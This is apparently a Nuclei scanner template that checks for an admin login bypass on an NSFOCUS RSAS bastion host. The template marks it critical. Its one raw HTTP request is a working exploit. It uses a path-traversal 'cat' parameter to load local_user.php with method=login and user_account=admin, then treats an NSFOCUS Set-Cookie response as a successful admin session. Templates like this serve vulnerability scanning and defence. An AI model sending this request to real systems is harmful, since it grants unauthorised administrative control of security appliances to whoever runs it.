id: nsfocus-loginBypass
info:
  author: Str1am
  name: "\u7EFF\u76DFRSAS\u5821\u5792\u673Aadmin\u767B\u5F55"
  severity: critical
  tags: nsfocus
requests:
- matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: header
    type: word
    words:
    - NSFOCUS
    - Set-Cookie
  matchers-condition: and
  raw:
  - 'GET /api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin
    HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
    like Gecko) Chrome/76.0.3809.132 Safari/537.36

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3

    Accept-Encoding:gzip,deflate

    Content-Length: 3

    Accept-Language: zh-CN,zh;q=0.9

    Connection: close

    '
